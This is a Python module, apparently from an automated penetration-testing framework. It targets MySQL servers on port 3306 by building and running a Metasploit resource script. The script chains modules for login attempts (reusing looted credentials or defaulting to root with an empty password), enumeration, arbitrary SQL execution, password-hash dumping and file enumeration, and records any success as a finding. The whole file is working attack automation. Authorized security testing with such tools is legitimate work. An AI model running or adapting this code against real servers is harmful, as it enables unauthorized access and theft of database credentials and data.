import os
from core.executor import run_msf_resource, write_msf_resource
from core.logger import get_logger
from core.utils import make_out_dir
from config import tool_available

MSF_MYSQL_MODULES = [
    "auxiliary/scanner/mysql/mysql_version",
    "auxiliary/scanner/mysql/mysql_login",
    "auxiliary/admin/mysql/mysql_enum",
    "auxiliary/admin/mysql/mysql_sql",
    "auxiliary/scanner/mysql/mysql_hashdump",
    "auxiliary/scanner/mysql/mysql_file_enum",
]

def run(ctx):
    log = get_logger(); log.banner("SERVICE -- MySQL Metasploit Modules"); log.set_phase("mysql_msf")
    if not tool_available("msfconsole"):
        log.warn("msfconsole not found -- skipping MySQL MSF modules"); return

    targets = [(h,p) for h in ctx.live_hosts
               for p in ctx.open_ports.get(h,{}).get("tcp",[]) if p == 3306]
    if not targets: return

    for host, port in targets:
        out_dir = make_out_dir(ctx.out_dir, "services", "mysql", host)
        creds = [c for c in ctx.loot.get("credentials",[])
                 if c.get("service")=="mysql" and c.get("host")==host]
        user = creds[0]["user"] if creds else "root"
        pw   = creds[0]["password"] if creds else ""

        # All modules in one session — avoids repeated 60s startup cost
        log.info(f"  MSF MySQL all modules on {host}:{port}")
        lines = []
        for module in MSF_MYSQL_MODULES:
            lines += [
                f"use {module}",
                f"set RHOSTS {host}",
                f"set RPORT {port}",
                f"set USERNAME {user}",
                f"set PASSWORD {pw}",
                "set VERBOSE false",
                "run",
            ]
        lines.append("exit -y")
        rc_path = "/tmp/msf_mysql_all.rc"
        out_path = os.path.join(out_dir, "msf_mysql_all.txt")
        write_msf_resource(rc_path, lines)
        rc, out, _ = run_msf_resource(rc_path, timeout=60)
        with open(out_path, "w") as f: f.write(out)
        if "[+]" in out or "success" in out.lower():
            ctx.add_finding("HIGH", host, "MSF MySQL success", out[:500])
            log.success(f"  MSF MySQL hit on {host}")
